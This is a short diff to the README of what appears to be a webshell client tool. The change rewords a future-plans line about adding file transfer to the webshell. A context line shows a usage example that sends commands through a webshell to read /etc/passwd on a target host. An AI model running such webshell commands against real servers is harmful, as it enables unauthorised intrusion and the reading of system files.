@@ -61,5 +61,5 @@ Read file contents:
 python3 client.py -u http://example.com/webshell.php -t cat -p "/etc/passwd" --post-param "cmd"
 ```
 ## Future Plans
-I want to add an upload/download file feature to the webshell, might get to that later  
+I want to add an upload/download file feature, might get to that later  
 Enjoy!
